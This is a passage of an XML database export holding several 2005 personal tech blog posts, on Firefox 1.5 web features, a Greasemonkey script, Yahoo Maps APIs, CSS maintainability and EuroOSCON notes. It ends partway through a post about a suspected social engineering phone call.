		<field name="body">&lt;p&gt;If you send e-mail to my old &lt;code&gt;cs1spw@bath.ac.uk&lt;/code&gt; address I won't get it - that account has been closed now that I've graduated from University. You can get my current e-mail address by clicking the big &quot;Reveal my Address&quot; button on &lt;a href=&quot;http://simon.incutio.com/contact/&quot;&gt;my contact page&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-09-08 19:16:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1504</field>
		<field name="title">Firefox 1.5 developer highlights</field>
		<field name="slug">firefox15</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;&lt;a href=&quot;http://www.mozilla.org/products/firefox/releases/1.5beta1.html&quot;&gt;Firefox 1.5 Beta 1 is out&lt;/a&gt;, and is the most exciting browser release in a very long time. It comes with the Gecko 1.8 rendering engine, which includes a ton of interesting new features. New in this version (unless you've been tinkering with the Deer Park series):&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;SVG&lt;/li&gt;
 &lt;li&gt;Canvas&lt;/li&gt;
 &lt;li&gt;CSS3 Columns&lt;/li&gt;
 &lt;li&gt;JavaScript 1.6&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-1&quot;&gt;Let's take a look at these in turn.&lt;/p&gt;

&lt;h4&gt;SVG&lt;/h4&gt;

&lt;p id=&quot;p-2&quot;&gt;The &lt;a href=&quot;http://www.mozilla.org/projects/svg/&quot;&gt;Mozilla SVG project&lt;/a&gt; has been quietly chugging along for years now, but until quite recently you needed to download an entirely separate build of Mozilla to try it out. Firefox 1.5 is the first Firefox release to include it and opens up a whole new world of vector graphics to web developers. The &lt;a href=&quot;http://www.croczilla.com/svg/samples/&quot;&gt;Croczilla Examples page&lt;/a&gt; is a great place to start - be sure to try the interactive demos near the bottom. There's more about Mozilla's SVG support &lt;a href=&quot;http://developer.mozilla.org/en/docs/SVG&quot; title=&quot;SVG on Devmo&quot;&gt;on the Mozilla Developer Centre&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Canvas&lt;/h4&gt;

&lt;p id=&quot;p-3&quot;&gt;The &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; element introduces a modern 2D drawing API to client-side development, with the promise of a 3D API in the future. It was invented by Apple for use in Dashboard widgets, then written up as &lt;a href=&quot;http://whatwg.org/specs/web-apps/current-work/#dynamic&quot; title=&quot;5.1. Dynamic graphics: The bitmap canvas&quot;&gt;a specification&lt;/a&gt; by the WHATWG to facilitate compatible implementations in other browsers. &lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;The potential for innovation with &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; is enormous. Demos are pretty thin on the ground at the moment, but this &lt;a href=&quot;http://ponderer.org/download/canvas_demo/&quot;&gt;interactive demo&lt;/a&gt; by Darin Fisher hints at the things to come. The &lt;a href=&quot;http://mozilla.doslash.org/stuff/canvas/shell.html&quot;&gt;Canvas shell&lt;/a&gt; is handy for playing with the API. Devmo has the beginnings of a great &lt;a href=&quot;http://developer.mozilla.org/en/docs/Canvas_tutorial&quot;&gt;Canvas tutorial&lt;/a&gt;. &lt;a href=&quot;http://undefined.org/js/canvas0000.html&quot;&gt;This thing&lt;/a&gt; (originally a Safari 1.3 demo) is pretty too.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;The ability for Firefox extensions to &lt;a href=&quot;http://weblogs.mozillazine.org/roc/archives/2005/05/rendering_web_p.html&quot;&gt;render web pages to images&lt;/a&gt; using &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; should lead to some very cool new extensions in the future.&lt;/p&gt;

&lt;h4&gt;CSS3 Columns&lt;/h4&gt;

&lt;p id=&quot;p-6&quot;&gt;The ability to create auto-flowing columns (famously achieved on &lt;a href=&quot;http://www.iht.com/&quot;&gt;IHT.com&lt;/a&gt; using terrifyingly hairy JavaScript) has long been desired for the web - among other things it's a neat way of keeping line widths comfortably readable. The &lt;a href=&quot;http://www.w3.org/TR/2001/WD-css3-multicol-20010118/&quot;&gt;CSS3 Multi-column layout module&lt;/a&gt; enables this ability, and Gecko 1.8 implements parts of it in the form of the &lt;code&gt;-moz-column-count&lt;/code&gt;, &lt;code&gt;-moz-column-width&lt;/code&gt; and &lt;code&gt;-moz-column-gap&lt;/code&gt; properties - the &lt;code&gt;-moz-&lt;/code&gt; prefix is &lt;a href=&quot;http://www.w3.org/TR/CSS21/syndata.html#q4&quot; title=&quot;CSS 2.1: Syntax and basic data types&quot;&gt;W3C approved syntax&lt;/a&gt; for vendor-specific CSS extensions. You can see columns in action on &lt;a href=&quot;http://weblogs.mozillazine.org/roc/archives/2005/03/gecko_18_for_we.html&quot; title=&quot;Gecko 1.8 For Web Developers: Columns&quot;&gt;Robert O'Callahan's blog&lt;/a&gt; (Robert implemented column support in Gecko). Devmo's &lt;a href=&quot;http://developer.mozilla.org/en/docs/CSS3_Columns&quot;&gt;column documentation&lt;/a&gt; has further details.&lt;/p&gt;

&lt;h4&gt;JavaScript 1.6&lt;/h4&gt;

&lt;p id=&quot;p-7&quot;&gt;According to &lt;a href=&quot;http://developer.mozilla.org/en/docs/New_in_JavaScript_1.6&quot;&gt;New in JavaScript 1.6&lt;/a&gt;, the new features are E4X support, Array extras and &quot;Array and String generics&quot;. I can't find anything detailing what the latter means, but the first two are pretty interesting. E4X (aka &lt;a href=&quot;http://www.ecma-international.org/publications/standards/Ecma-357.htm&quot; title=&quot;Standard ECMA-357&quot;&gt;ECMAScript for XML&lt;/a&gt;) is a relatively new specification which promotes XML to a native data type. It lets you do things like this:&lt;/p&gt;


&lt;blockquote cite=&quot;http://www.mozdev.org/pipermail/greasemonkey/2005-September/005639.html&quot;&gt;&lt;pre&gt;&lt;code&gt;
var x = &amp;lt;foo&amp;gt;&amp;lt;bar&amp;gt;baz&amp;lt;/bar&amp;gt;&amp;lt;/foo&amp;gt;;
alert(x.bar);
x.monkey = &quot;good&quot;;
alert(x.toXMLString());

for each (var child in x) {
  alert(x.toXMLString());
}&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-8&quot;&gt;(Example excerpted from &lt;a href=&quot;http://www.mozdev.org/pipermail/greasemonkey/2005-September/005639.html&quot; title=&quot;[Greasemonkey] e4x (say horray)&quot;&gt;Aaron's post&lt;/a&gt; to the Greasemonkey mailing list.)&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;It isn't available within script tags by default: you have to explicitly turn it on with &lt;code&gt;&amp;lt;script type=&quot;text/javascript;e4x=1&quot;&amp;gt;&lt;/code&gt;, presumably to preserve backwards compatibility with existing pages.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;Array extras consist of some new methods on the &lt;code&gt;Array&lt;/code&gt; class, the most interesting of which are &lt;code&gt;every()&lt;/code&gt;, &lt;code&gt;forEach()&lt;/code&gt;, &lt;code&gt;map()&lt;/code&gt;, &lt;code&gt;filter()&lt;/code&gt; and &lt;code&gt;some()&lt;/code&gt;. Each of these takes a function reference (i.e. a callback) as an argument and applies it to each item in the array in some manner. Fans of functional programming techniques will welcome these, and they can easily be enabled in older browsers by conditionally modifying &lt;code&gt;Array.prototype&lt;/code&gt;. WebReference.com has &lt;a href=&quot;http://www.webreference.com/programming/javascript/ncz/column4/index.html&quot; title=&quot;Mozilla&amp;apos;s New Array Methods&quot;&gt;a tutorial&lt;/a&gt; covering the new array methods.&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;If anyone knows what &quot;Array and String generics&quot; are, please leave a comment!&lt;/p&gt;

&lt;p id=&quot;p-12&quot;&gt;The above are just the highlights of Firefox 1.5 from a web developer's perspective. The improvements for regular users are also notable, including re-orderable tabs, caching of browser state for lightning-fast back and forward and lots of cosmetic (and performance) improvements for the Mac version. An &lt;a href=&quot;http://www.squarefree.com/burningedge/releases/1.5b1.html&quot; title=&quot;What&amp;apos;s new in Firefox 1.5 Beta 1&quot;&gt;unofficial changelog&lt;/a&gt; is available courtesy of the Burning Edge.&lt;/p&gt;

&lt;p id=&quot;p-13&quot;&gt;Exciting times indeed.&lt;/p&gt;</field>
		<field name="created">2005-09-11 13:46:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1505</field>
		<field name="title">More fun with the monkey</field>
		<field name="slug">monkeyfun</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Cory Doctorow points to &lt;a href=&quot;http://memory.loc.gov/ammem/fsachtml/fsacsubjindex1.html&quot;&gt;America from the Great Depression to World War II: Color Photographs from the FSA-OWI, 1939-1945&lt;/a&gt;, with the &lt;a href=&quot;http://www.boingboing.net/2005/09/16/color_photos_of_the_.html&quot; title=&quot;Color photos of the US 1939-1945&quot;&gt;following observation&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.boingboing.net/2005/09/16/color_photos_of_the_.html&quot;&gt;&lt;p id=&quot;p-1&quot;&gt;Unfortunately, the organizational back-end for this is so primitive (especially in comparison with modern image-sharing and organizing sites like &lt;a href=&quot;http://flickr.com/&quot;&gt;Flickr&lt;/a&gt;) that it, too, seems to hail from 1939-1945, making the site a real pain to navigate and use.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-2&quot;&gt;Thanks to &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;Greasemonkey&lt;/a&gt;, great content spoiled by poor navigation is a solvable problem.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;&lt;a href=&quot;http://simon.incutio.com/code/greasemonkey/americanmemoryfixer.user.js&quot;&gt;americanmemoryfixer.user.js&lt;/a&gt; includes the following improvements:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Changes the colour scheme to black-on-white, and the typeface to Verdana.&lt;/li&gt;
  &lt;li&gt;Removes all table borders.&lt;/li&gt;
  &lt;li&gt;Adds headings to some pages, and fixes various title tags.&lt;/li&gt;
  &lt;li&gt;Sets the default gallery view to be a set of thumbnails, rather than a list of names.&lt;/li&gt;
  &lt;li&gt;Displays a large image (as opposed to a thumbnail) when you view a photograph.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-4&quot;&gt;The scariest hack in the script is the way in which subject page titles are passed around. In the current site, if you visit a category page (such as &lt;a href=&quot;http://memory.loc.gov/cgi-bin/query/r?ammem/fsaall:@FILREQ(@field(SUBJ+@band(Sharecroppers+))+@FIELD(COLLID+fsac))&quot;&gt;Sharecroppers&lt;/a&gt;) the title of the category is not displayed on the page - even though it has been passed as a parameter in the URL. If you click a link (say to the Galley thumbnail page) the information in the URL is lost as well.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;My solution was to extract the subject from the URL on that first page, then rewrite the other links to include an additional &quot;&amp;amp;subject=Sharecroppers&quot; parameter. This new parameter is ignored by the CGI scripts that power the site, but my Greasemonkey script watches out for it on subsequent pages and uses it to  display a title (and further propagate it to other links on the page). It's not a very robust solution, but it's good enough.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;There's plenty of scope for further improvement - if you want to use my script as a starting point, please feel free.&lt;/p&gt;</field>
		<field name="created">2005-09-17 19:44:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1506</field>
		<field name="title">Working for Yahoo!</field>
		<field name="slug">yahoo</field>
		<field name="body">&lt;p&gt;I guess it's about time I blogged this: Monday was my first official day working for Yahoo! I've joined the new Technology Development group, first mentioned by Jeremy Zawodny &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/004903.html&quot; title=&quot;Marc Davis Joins Yahoo, Job Update, etc...&quot;&gt;a couple of months ago&lt;/a&gt;. My first assignment is with the &lt;a href=&quot;http://www.flickr.com/&quot;&gt;Flickr&lt;/a&gt; team, where I will be working on some Cool New Stuff. How exciting is that?&lt;/p&gt;

&lt;p&gt;I'm in California this week, but I'll be working from the London offices for the next year.&lt;/p&gt;</field>
		<field name="created">2005-09-21 01:39:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1507</field>
		<field name="title">Maintainability, a.k.a. the CSS elephant</field>
		<field name="slug">maintainability</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Now that even &lt;a href=&quot;http://slashdot.org/&quot;&gt;Slashdot&lt;/a&gt; has made the move to CSS it's safe to say that the CSS advocacy battle is slowly being won. It's time to talk about the elephant in the corner of the room: stylesheet maintainability.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The C in CSS stands for the Cascade - a complex but elegant set of rules governing which style rule has precedence in cases of conflict. Consider the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;* { color: black; }
h2 { color: red; }
div#header h2 { color: green; }
h2.funky { color: orange; }&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-2&quot;&gt;An h2 with class &quot;funky&quot; inside a div with id &quot;header&quot; matches all of the above rules - it's up to the cascade to pick the most specific one. While the key element of this process is calculating specificity a number of other differences such as @import v.s. linked stylesheets also plays a part.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;There's one big problem: if you see an h2 in the source code, you need to have a pretty intimate knowledge of the stylesheets being applied (not to mention the cascade rules governing them) to work out which rules are in effect. It's a far sight trickier than deciphering &lt;code&gt;&amp;lt;font size=&quot;3&quot; color=&quot;red&quot;&amp;gt;&lt;/code&gt;. If a page element isn't displaying the way you want it to, tracking down the cause can be a nightmare.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;What's needed is a well understood set of techniques for writing maintainable stylesheets. I'm interested in collecting advice on this, especially from people who have tackled this problem in a situation where more than one person has to work on the same CSS code. I'm particularly interested in ideas on how to best split up a large set of rules over multiple stylesheets. If you have any tips, please post a comment, write it up on your own site, &lt;a href=&quot;http://simon.incutio.com/contact/&quot;&gt;e-mail me&lt;/a&gt; or add it to &lt;a href=&quot;http://css-discuss.incutio.com/?page=MaintainableCss&quot; title=&quot;Maintainable CSS on the CSS-Discuss wiki&quot;&gt;the wiki page&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-09-26 19:24:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1508</field>
		<field name="title">Canvas demos</field>
		<field name="slug">canvas</field>
		<field name="body">&lt;p&gt;Jesse Andrews (of &lt;a href=&quot;http://bookburro.org/&quot;&gt;Book Burro&lt;/a&gt; and &lt;a href=&quot;http://userscripts.org/&quot;&gt;userscripts.org&lt;/a&gt; fame) has built some &lt;a href=&quot;http://overstimulate.com/projects/canvas/&quot;&gt;awesome canvas demos&lt;/a&gt; for users of Safari or Firefox 1.5. He has a bar chart and some animated rectangles, but the real gem is the live chart which polls a server using XMLHttpRequest and updates a line graph with live data. He also has some fun mathematical experiments: a cellular automata generator and a neat exploration of &lt;a href=&quot;http://en.wikipedia.org/wiki/Lindenmayer_System&quot;&gt;Lindenmayer systems&lt;/a&gt; (both &lt;a href=&quot;http://overstimulate.com/projects/canvas/lindenmayer.html&quot; title=&quot;Canvas Lindenmayer Systems&quot;&gt;static&lt;/a&gt; and &lt;a href=&quot;Interactive Canvas Lindenmayer Systems&quot;&gt;interactive&lt;/a&gt;). Read more &lt;a href=&quot;http://overstimulate.com/articles/2005/10/04/canvas-examples&quot; title=&quot;overstimulate: Canvas examples&quot;&gt;on his blog&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-10-05 16:43:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1509</field>
		<field name="title">Things I learned at EuroOSCON</field>
		<field name="slug">eurooscon</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Last week was the first ever &lt;a href=&quot;http://conferences.oreillynet.com/eurooscon/&quot;&gt;O'Reilly European Open Source Convention&lt;/a&gt;, held in the magnificent NH Grand Hotel Krasnapolsky in Amsterdam. It was the first big budget conference I'd been too (previously I've stuck to less expensive affairs such as SxSW Interactive and PyCon) but the money seems to have been well spent. The venue was fantastic and there was a great line-up of speakers, keynotes and panels.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I organised a Python Lightning Talks session at the last minute (I agreed to run them on Monday) which, despite some trouble with the room booking, seemed to go pretty well. Overall there was a strong bias towards Perl at the conference, probably because the European Perl scene is well established (see the &lt;a href=&quot;http://london.pm.org/&quot;&gt;London Perl Mongers&lt;/a&gt;) and can provide plenty of excellent speakers.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I met a whole bunch of great people in and out of the sessions, and caught up on a lot of projects that I might have otherwise missed. Here are some of the  things I learnt during the convention:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Damian Conway really is worth getting up early in the morning for. His presentation (mercilessly mocking Web 2.0, venture capitalists, tagging, social software and more) was hilarious. It became even funnier when I heard from some people who had attended his &lt;a href=&quot;http://conferences.oreillynet.com/cs/eurooscon/view/e_sess/7446&quot;&gt;Presentation Aikido&lt;/a&gt; tutorial that he had broken every single one of his own rules for giving a good presentation.&lt;/li&gt;
 &lt;li&gt;Web 2.0 mainly just means building applications that take advantage of the true nature of the web (network effects, smart linking, REST principles). Kind of like writing &quot;Pythonic&quot; Python code.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.secondlife.com/&quot;&gt;Second Life&lt;/a&gt; leaves every other &lt;acronym title=&quot;Massively Multiplayer Online Role Playing Game&quot;&gt;MMORPG &lt;/acronym&gt;for dead when it comes to capacity for creativity. If you ever get a chance to see a demo from a Second Lifer, go for it. Personally I plan to stay well clear of the whole thing, for risk of losing my first life!&lt;/li&gt;
 &lt;li&gt;Rails almost lives up to the hype. I pretty much knew that already, but some of the stuff people are building with it (with unbelievably low line counts) is amazing.&lt;/li&gt;
 &lt;li&gt;Open Standards are even more important than open code. One of Simon Phipps' key points was that while open source may mean freedom for developers, it's open standards that provide freedom for regular users.&lt;/li&gt;
 &lt;li&gt;Gnome 2 has enormous usability improvements over Gnome 1. Gone are the preference panes that allow you to disable certain visual effects in very specific contexts (sometimes using slider widgets to modify the values). The Gnome team want to take this focus on usability further, replacing the concepts of Windows, Icons, Menus, Pointers with People, Events, Documents and Getting Laid.&lt;/li&gt;
 &lt;li&gt;The future of software security lies in modularised software permissions - HTML renderers shouldn't need direct access to password stores, JPEG renderers shouldn't have the ability to start shells. Making this kind of security policy usable is the real challenge.&lt;/li&gt;
 &lt;li&gt;&quot;You can do lots of interesting things with Trusted Computing, particularly if you are evil&quot; - paraphrased from Alan Cox.&lt;/li&gt;
 &lt;li&gt;It's already possible for a worm to destroy your machine, thanks to writeable firmware on video cards and hardware level passwords on IDE drives. If a worm locked your drive with a random password, it would be illegal under the DMCA to recover your files.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://news.bbc.co.uk/&quot;&gt;news.bbc.co.uk&lt;/a&gt; serves up static files with a simple SSI for the recent headlines. The site grows at a rate of 2.5 GB a month, mirrored across 52 servers in London and New York.&lt;/li&gt;
 &lt;li&gt;PHP 6 (out next year) will probably have namespaces!&lt;/li&gt;
 &lt;li&gt;PHP is designed as a glue layer between lots of useful C libraries. &quot;PHP is like the Borg - it adds the skills of others to its own&quot;.&lt;/li&gt;
 &lt;li&gt;License proliferation is a key problem facing Open Source today, thanks to incompatibilities between different licenses. Microsoft realised this with respect to their own Shared Source licenses, and have &lt;a href=&quot;http://weblogs.mozillazine.org/gerv/archives/2005/10/microsoft_annou.html&quot; title=&quot;Microsoft Announces New Shared Source Licences&quot;&gt;dramatically simplified them&lt;/a&gt; as a result.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://svk.elixus.org/&quot;&gt;SVK&lt;/a&gt; is much more interesting than the other distributed version control systems, because it lets you mirror from, branch and commit patches back to Subversion, CVS, Perforce and more.&lt;/li&gt;
 &lt;li&gt;Perl 6 lives, in the form of &lt;a href=&quot;http://pugscode.org/&quot;&gt;PUGS&lt;/a&gt;, an impressively advanced implementation written in Haskell. There was quite a bit of buzz surrounding Haskell at the conference - it looks like type inference languages are ready for the mainstream (or maybe the mainstream is finally ready for them).&lt;/li&gt;
 &lt;li&gt;There's a lot of activity in open source database replication and clustering at the moment. Postgres solutions include &lt;a href=&quot;http://pgpool.projects.postgresql.org/&quot;&gt;pgpool&lt;/a&gt; and &lt;a href=&quot;http://gborg.postgresql.org/project/slony1/projdisplay.php&quot;&gt;Slony&lt;/a&gt;; Slony 2 in 2006 will perform multi-master synchronous replication using Ethernet multicast. Meanwhile &lt;a href=&quot;http://www.mysql.com/products/database/cluster/&quot;&gt;MySQL Cluster&lt;/a&gt; (based on technology built by Ericsson for the telecoms industry) provides low-cost, extremely high availability clustering at a small cost in performance, depending on the nature of your database queries.&lt;/li&gt;
 &lt;li&gt;The European broadcast flag proposals are even nastier than the US ones, and the fight to stop them is only just beginning.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-3&quot;&gt;My &lt;a href=&quot;http://www.flickr.com/photos/simon/sets/1184250/&quot;&gt;meagre collection of photos&lt;/a&gt; is up on Flickr. One of the downsides of Flickr is that any geeky event I attend is likely to have hundreds of photos posted, which greatly reduces my desire to take any myself.&lt;/p&gt;</field>
		<field name="created">2005-10-24 23:40:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1510</field>
		<field name="title">Taking charge of your own destiny</field>
		<field name="slug">destiny</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Scoble has posted &lt;a href=&quot;http://scobleizer.wordpress.com/2005/11/01/ross-doesnt-trust-microsofts-approach-to-web/&quot;&gt;12 reasons that Web 2.0 entrepreneurs are steering clear of the Microsoft platform&lt;/a&gt;. It's an interesting list (the comments are full of treats too) but for me it misses the key reason that open source development tools are so compelling: they &lt;strong&gt;put you in charge of your own destiny&lt;/strong&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Allow me to elaborate.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;As developers, our lives revolve around abstractions. The key activity when programming is designing and using abstractions - we weave them together to create new ones, with our target being an abstraction that lets our users  achieve their goals.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;The problem with abstractions is that &lt;a href=&quot;http://www.joelonsoftware.com/articles/LeakyAbstractions.html&quot; title=&quot;The Law of Leaky Abstractions&quot;&gt;they leak&lt;/a&gt;. The taller the stack of abstractions (browsers on templates on Django on mod_python on Apache on Linux on hardware on a network) the more components there are that can go wrong. When they do go wrong, we need to work out why and find a solution.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If your development stack includes closed source components, there's a limit on how far you can dig. Run in to a bug is the underlying platform (or an undocumented feature or just something you don't understand) and you are left at the mercy of your vendor. You only control the top part of your system.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Contrast this with open source. If some part of your stack breaks, you have a bunch of possibilities:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Go to the project's bug tracker and seek a solution there.&lt;/li&gt;
 &lt;li&gt;Work out the cause of the problem and fix it yourself.&lt;/li&gt;
 &lt;li&gt;Hire someone else to fix it for you.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-6&quot;&gt;Proprietary software vendors may offer paid support options, or even give you access to their bug tracker (if you pay them enough). But if they let you down there's nowhere else to turn. With open source there's always something else for you to try.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;There are a great deal of other advantages to developing on top of open source, but to my mind the ability to completely understand and control the abstractions that form your building blocks is the most important of them all. Unfortunately for Microsoft, it's also the one that is hardest for them to duplicate.&lt;/p&gt;</field>
		<field name="created">2005-11-01 21:55:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1511</field>
		<field name="title">Yahoo!'s new twist on mapping APIs</field>
		<field name="slug">maps</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;One of the most exciting things I've seen at Yahoo! since starting here has finally been made public: the &lt;a href=&quot;http://maps.yahoo.com/beta/&quot;&gt;new Yahoo Maps&lt;/a&gt;. The map application itself differs from many other recent map sites in being rendered entirely in Flash. This leaves far more scope for interface niceties, but doesn't it reduce the scope for hacking that made things like Google Maps so much fun?&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Not at all. The maps team have produced &lt;a href=&quot;http://developer.yahoo.net/maps/index.html&quot; title=&quot;Yahoo! Maps APIs&quot;&gt;a set of APIs&lt;/a&gt; that should make any geo-hacker very happy indeed. Take a look at these, all launched today:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.net/maps/flash/asGettingStarted.html&quot;&gt;Flash-ActionScript API&lt;/a&gt;, for embedding maps in your Flash applications. When you think about the number of talented Flash developers out there for whom an Ajax toolkit is of little interest, the potential for innovation here is enormous. Not to mention that custom vector overlays of map information are far better suited to Flash than to JavaScript.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.net/maps/flash/jsGettingStarted.html&quot;&gt;Flash-JavaScript API&lt;/a&gt;, for embedding Flash maps within normal pages and driving them from regular JavaScript. You can also drop custom Flash widgets and markers in to the page from this API just by providing the URL of a SWF file, which should allow ActionScript programmers to achieve virtually anything they can imagine.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://developer.yahoo.net/maps/flash/flexGettingStarted.html&quot;&gt;Flex API&lt;/a&gt;, for adding maps to Flex applications. I'm don't know too much about Flex (which is billed by Macromedia as an &quot;enterprise&quot; development tool), but the syntax example is pretty compelling: &lt;code&gt;&amp;lt;yahoo:YahooMap id=&quot;myMap&quot; width=&quot;550&quot; height=&quot;400&quot; zoomLevel=&quot;3&quot; latitude=&quot;37.77159&quot; longitude=&quot;-122.401714&quot; /&amp;gt;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;Don't like Flash? There's an &lt;a href=&quot;http://developer.yahoo.net/maps/ajax/index.html&quot;&gt;Ajax JavaScript API&lt;/a&gt; as well, no Flash required. Create pannable, zoomable maps, drive them from JavaScript and add custom markers to them.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-2&quot;&gt;That's the core APIs relating to maps, but geo-hackers will be pleased to hear about some of the related API and API improvements that have also been rolled out:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;A &lt;a href=&quot;http://developer.yahoo.net/maps/rest/V1/geocode.html&quot;&gt;Geocoding API&lt;/a&gt;. Geocoding is when you take an address (or partial address) in text format and turn it in to a latitude/longitude point or set of possible matches.&lt;/li&gt;
 &lt;li&gt;A &lt;a href=&quot;http://developer.yahoo.net/maps/rest/V1/mapImage.html&quot;&gt;Map Image API&lt;/a&gt;, which gives you direct access to the tile servers. Specify a point or address and some dimensions and get back a custom generated map image. This means you can build a mapping application without any client side scripting at all, or alternatively roll your own panning/zooming code in any language or platform you can think of.&lt;/li&gt;
 &lt;li&gt;A new version of the &lt;a href=&quot;http://developer.yahoo.net/search/local/V2/localSearch.html&quot;&gt;Local Search Web Service&lt;/a&gt;, which now returns specific location information as a lat/long pair.&lt;/li&gt;
 &lt;li&gt;A &lt;a href=&quot;http://developer.yahoo.net/traffic/rest/V1/index.html&quot;&gt;traffic API&lt;/a&gt;, providing traffic alert information for the location you specify. Again, lat/long is included.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-3&quot;&gt;I think you'll agree that this is all extremely exciting stuff. You can see some of the applications people have already built with it in the &lt;a href=&quot;http://developer.yahoo.net/maps/applications.html&quot;&gt;applications gallery&lt;/a&gt;. I'm sure there will be plenty more added over the next few weeks as creative people (especially Flash developers who haven't had access to tools like this before) get their teeth in to the new APIs.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Before I get your hopes up too much though, there are a few significant features that are currently missing from the current set of mapping tools.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;It's US only at the moment. This really sucks for the rest of the world. Personally I'd love to see at least country outlines added as soon as possible.&lt;/li&gt;
 &lt;li&gt;No aerial photos or satellite images.&lt;/li&gt;
 &lt;li&gt;There's a slightly odd restriction on using the APIs for &quot;real time&quot; applications. My guess is that this is related to the license under which the map data itself has been procured, to protect someone else's business model. On further reading, it seems that the Google Maps API has &lt;a href=&quot;http://www.google.com/apis/maps/terms.html&quot;&gt;the same restriction&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2005-11-03 09:39:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1512</field>
		<field name="title">Social engineering and Orange</field>
		<field name="slug">orange</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I had a call on my mobile earlier today from a lady claiming to be from &lt;a href=&quot;http://www.orange.co.uk/&quot;&gt;Orange&lt;/a&gt; (my phone service provider) who told me that my contract was about to expire. She asked me for my password.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Alarm bells instantly went off in my head, so I told her (truthfully as it happens) that I didn't know my password. Then she asked for my postcode instead.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;At this point I was pretty sure this was a social engineering attack, so I started to quiz her about why she needed the information. She said it was for a &quot;security check&quot;. I told her I was uncomfortable giving out information like this to a cold caller over the phone and she said it was nothing to worry about because it was all covered by &quot;the data protection act&quot;.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;I said that I would rather conduct my business in an Orange shop, and she told me that she would have to put a mark on my record that I had failed a security check. I interpreted this as a threat, which convinced me that the call was an attempted con. I asked for her name and ended the call.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;I e-mailed Orange customer support via &lt;a href=&quot;http://www.orange.co.uk/contact/&quot; title=&quot;Orange Customer Service&quot;&gt;their website&lt;/a&gt; with details of the call and the number it came from (07973 100 194, which looked like a mobile number to me and had further fuelled my suspicions). I just received their reply - the call really was from them!&lt;/p&gt;

